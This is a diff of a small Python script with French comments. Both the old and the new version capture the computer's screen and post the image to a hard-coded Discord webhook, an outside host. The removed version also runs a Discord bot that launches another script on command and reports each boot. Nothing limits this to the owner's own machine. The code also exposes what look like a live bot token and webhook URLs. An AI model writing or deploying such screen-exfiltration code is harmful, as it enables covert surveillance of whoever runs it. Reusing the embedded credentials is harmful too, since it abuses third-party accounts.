@@ -1,90 +1,41 @@
 import requests
 from PIL import ImageGrab
 import os
-from datetime import datetime
-import time 
-import discord
-from discord import app_commands
-import subprocess
 
-TOKEN = "MTM5OTUyOTIyMzMxMTU4OTQ1Nw.GdKiWc.e9uqcumFDxHYIFd8jgElF9qTmz4v6O5R_oaZ_I"
+# Configuration
+WEBHOOK_URL = "https://discord.com/api/webhooks/1450922309891391652/j_WkuEvDxWSNpICu5KBccsK1r4-nfRrIfZatPGyUPTQRWAQ9C0EZ3YXu2v5XgStzodPd"
+FILE_NAME = "temp_screen.png"
 
-intents = discord.Intents.default()
-client = discord.Client(intents=intents)
-tree = app_commands.CommandTree(client)
-
-@client.event
-async def on_message(message):
-    if message.content == "!lance":
-        subprocess.Popen(["python", "lance.py"])
-        await message.channel.send("Script lancé !")
-
-@tree.command(name="scree", description="Prend une capture d'écran et l'envoie ici")
-async def scree(interaction: discord.Interaction):
-    screenshot_path = "screenshot.png"
+def send_screenshot():
     try:
+        # 1. Capture de l'écran
         screenshot = ImageGrab.grab()
-        screenshot.save(screenshot_path)
-        await interaction.response.send_message("Voici la capture d'écran :", file=discord.File(screenshot_path))
+        screenshot.save(FILE_NAME)
+
+        # 2. Préparation et envoi vers Discord
+        with open(FILE_NAME, "rb") as f:
+            payload = {
+                "content": "📸 **Nouvelle capture d'écran reçue !**"
+            }
+            files = {
+                "file": (FILE_NAME, f)
+            }
+            
+            response = requests.post(WEBHOOK_URL, data=payload, files=files)
+
+        # 3. Vérification du succès
+        if response.status_code == 200 or response.status_code == 204:
+            print("Capture envoyée avec succès !")
+        else:
+            print(f"Erreur lors de l'envoi : {response.status_code}")
+
     except Exception as e:
-        await interaction.response.send_message(f"Erreur lors de la capture d'écran : {e}")
+        print(f"Une erreur est survenue : {e}")
+
     finally:
-        if os.path.exists(screenshot_path):
-            os.remove(screenshot_path)
+        # 4. Nettoyage : suppression du fichier image
+        if os.path.exists(FILE_NAME):
+            os.remove(FILE_NAME)
 
-@client.event
-async def on_ready():
-    await tree.sync()
-    print(f"Connecté en tant que {client.user}")
-
-client.run(TOKEN)
-
-WEBHOOK_URL = "https://discord.com/api/webhooks/1375188922644304054/YT7__8T369CKtxPDUjf4SRXrtOHNqOT8cby4SlDbBWtxkqtYhLJSMCkZKvN07iQ3XDrN"
-
-
-now = datetime.now()
-heure_str = now.strftime("%Y-%m-%d %H:%M:%S")
-message = {
-    "username": "Ton PC",
-    "content": f"🖥️ Ton PC vient de démarrer à {heure_str} !"
-}
-
-
-
-
-try:
-    response = requests.post(WEBHOOK_URL, json=message)
-    if response.status_code == 204:
-        print("Message envoyé avec succès.")
-    else:
-        print(f"Erreur lors de l'envoi du message : {response.status_code}, {response.text}")
-except Exception as e:
-    print(f"Exception lors de l'envoi du message : {e}")
-
-
-screenshot_path = "screenshot.png"
-try:
-    screenshot = ImageGrab.grab()
-    screenshot.save(screenshot_path)
-    print("Capture d'écran prise avec succès.")
-except Exception as e:
-    print(f"Erreur lors de la capture d'écran : {e}")
-    exit(1)
-
- 
-
-try:
-    with open(screenshot_path, "rb") as f:
-        files = {"file": ("screenshot.png", f, "image/png")}
-        data = {"content": "-"}
-        response = requests.post(WEBHOOK_URL, data=data, files=files)
-
-    if response.status_code == 204:
-        print("Capture d'écran envoyée avec succès.")
-    else:
-        print(f"Erreur lors de l'envoi de la capture d'écran : {response.status_code}, {response.text}")
-except Exception as e:
-    print(f"Exception lors de l'envoi de la capture d'écran : {e}")
-finally:
-    if os.path.exists(screenshot_path):
-        os.remove(screenshot_path)
+if __name__ == "__main__":
+    send_screenshot()
